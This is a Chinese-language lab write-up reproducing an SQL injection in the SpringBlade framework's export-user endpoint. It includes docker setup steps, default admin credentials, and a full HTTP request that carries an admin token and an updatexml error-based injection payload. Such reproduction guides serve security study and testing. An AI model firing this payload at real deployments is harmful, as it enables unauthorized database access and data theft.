# SpringBlade export-user SQL 注入漏洞


SpringBlade是一个基于Spring Cloud和Spring Boot的开发框架，旨在简化和加速微服务架构的开发过程。它提供了一系列开箱即用的功能和组件，帮助开发人员快速构建高效可靠的微服务应用。该产品/api/blade-user/export-user接口存在SQL注入。

漏洞影响版本

SpringBlade <= v3.2.0

产品项目地址

https://gitee.com/smallc/SpringBlade

参考链接：

- https://blog.csdn.net/shelter1234567/article/details/136345699

## 环境搭建

执行如下命令启动前端项目Sword 和 后端项目 SpringBlade

```
docker compose up
```

环境启动后，访问`http://your-ip:1888`将看到Sword 的登录页面，账户与密码均为`admin`



## 漏洞复现

在用户管理页面选择导出数据

![](https://img-blog.csdnimg.cn/direct/6a69e684e7aa46baa3ec64892b6d9199.png)

burp抓包 增加sql注入payload

![](https://img-blog.csdnimg.cn/direct/bee783c2814648498bd14c0780a0fd44.png)

```
GET /api/blade-user/export-user?blade-auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwidG9rZW5fdHlwZSI6ImFjY2Vzc190b2tlbiIsImRlcHRfaWQiOiIxMTIzNTk4ODEzNzM4Njc1MjAxIiwiYWNjb3VudCI6ImFkbWluIiwiY2xpZW50X2lkIjoic3dvcmQiLCJleHAiOjE3MDkxMDQyMDcsIm5iZiI6MTcwOTEwMDYwN30.-Nniy1hq-gVtymm1MFWgbAuTOjwiMMheMccrXoIeeL4hbpRqMS2Fbsmf7EiJWBwMqSPX_Us4MAPevRdZVauNEQ&account=&realName=&updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
Host: 192.168.116.128:1888
```

